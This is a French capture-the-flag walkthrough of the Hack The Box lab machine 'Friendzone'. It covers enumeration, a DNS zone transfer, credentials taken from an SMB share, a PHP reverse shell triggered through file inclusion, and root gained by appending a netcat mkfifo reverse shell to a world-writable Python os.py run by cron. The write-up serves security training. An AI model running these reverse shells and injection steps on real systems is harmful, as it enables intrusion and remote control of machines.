![Pic1](../img/friendzone1.PNG?raw=true) </br>

# Introduction
Friendzone est une machine linux dont l'adresse IP est 10.10.10.123.</br>
Compétences mises en oeuvre :
* Enumération des ports et services d'une machine distante.
* Enumération des fichiers et dossiers d'un site web.
* Enumération des dossiers partagés de la box.
* Exploitation d'un transfert de zone DNS.
* Elevation de privilège via une tache cron qui execute un script.
</br>

# Enumération initiale
Nous commencons l'énumération par un scan des ports et services exposés de la box avec nmap :
```bash
$ nmap -T4 -A 10.10.10.123
```
![Pic2](../img/friendzone2.PNG?raw=true) </br>
Le port 80 est ouvert, nous allons faire un scan des dossiers et fichiers du site avec dirsearch :
```bash
$ dirsearch -w wordlist -e "php,txt" -f -t 100 -x 400,403,404,500 -u http://10.10.10.123/
```
![Pic3](../img/friendzone3.PNG?raw=true) </br>
Le port 445 étant ouvert, nous pouvons faire une énumération des dossiers partagés avec smbclient :
```bash
$ 
```
![Pic4](../img/friendzone4.PNG?raw=true) </br>

# Obtenir un accès utilisateur
On commence par découvrir ce que contient les dossiers partagés, le plus intéréssant étant general :
```bash
$ smbclient \\\\10.10.10.123\\general
smb > ls
smb > get creds.txt
```
![Pic5](../img/friendzone5.PNG?raw=true) </br>
Ainsi nous avons un identifiant et un mot de passe pour l'***admin THING***. Les autres dossiers partagés ne contiennent pas d'informations utiles.
Un petit tour sur la page web de la box nous permet de voir un sous domaine/autre domaine intéréssant :</br>
![Pic6](../img/friendzone6.PNG?raw=true) </br>
Un tour sur le port 443 nous permet de voir le certificat qui va confirmer le domaine précédent :</br>
![Pic7](../img/friendzone7.PNG?raw=true) </br>
En ajoutant "10.10.10.123 friendzone.red" dans notre /etc/hosts, nous obtenons la page suivante :</br>
![Pic8](../img/friendzone8.PNG?raw=true) </br>
Nous sommes sur le bon chemin mais on est surement passé à coté d'un truc, en faisant un transfer de zone avec dig, on en apprend un peu plus :
```bash
$ dig -t axfr @10.10.10.123 friendzone.red
```
![Pic9](../img/friendzone9.PNG?raw=true) </br>
Nous avons 3 sous domaines à tester : ***administrator1.friendzone.red***, ***hr.friendzone.red*** et ***uploads.friendzone.red***, nous les rajoutons alors dans /etc/hosts.
Sur **hr** : rien, sur **uploads** : un input pour upload des fichiers et sur **administrator1** : une page pour se connecter :</br>
![Pic10](../img/friendzone10.PNG?raw=true) </br>
![Pic11](../img/friendzone11.PNG?raw=true) </br>
Nous pouvons alors nous connecter avec les creds trouvés plus tôt :</br>
![Pic12](../img/friendzone12.PNG?raw=true) </br>
![Pic13](../img/friendzone13.PNG?raw=true) </br>
Nous avons donc une page pour upload un fichier, et une autre page nous disant comment accéder au fichier uploadé, nous allons faire un reverse shell
pour l'upload et l'exécuter :
```bash
$ vim rev.php 
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.48/9001 0>&1'");
```
Malheureusement, des problèmes pour accéder au fichier à partir du site, il faut alors mettre dans reverse shell dans le dossier
partagé Development et y accéder via la requête web :
```bash
$ smbclient \\\\10.10.10.123\\Development
smb > put rev.php
```
![Pic14](../img/friendzone14.PNG?raw=true) </br>
Maintenant la requête web :
```bash
https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/rev
```
Et nous avons notre netcat qui reçoit une connexion :</br>
![Pic15](../img/friendzone15.PNG?raw=true) </br>
Nous sommes en tant que www-data mais nous pouvons quand même lire le user.txt :</br>
![Pic16](../img/friendzone16.PNG?raw=true) </br>

# Obtenir un accès root
En remontant d'un cran, nous avons un fichier conf mysql avec l'utilisateur friend et son mot de passe :
```bash
$ cd ../
$ ls
$ cat mysql_data.conf
```
![Pic17](../img/friendzone17.PNG?raw=true) </br>
En réalisant l'énumération de base, il y a une tache cron qui execute le script /opt/server_admin/reporter.py, ce script contient :</br>
![Pic18](../img/friendzone18.PNG?raw=true) </br>
Le script utilise la librairie os, une énumération nous permet de voir le la lib est en permission 777 :
```bash
$ ls -aril /usr/lib/python2.7
```
![Pic19](../img/friendzone19.PNG?raw=true) </br>
Nous pouvons alors le modifier pour rajouter un reverse shell pour obtenir une connection en tant que root :
```bash
$ echo 'system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.9 4567 >/tmp/f")' >> os.py
```
Après un moment, la connection s'établie et nous pouvons lire le root.txt :</br>
![Pic20](../img/friendzone20.PNG?raw=true) </br>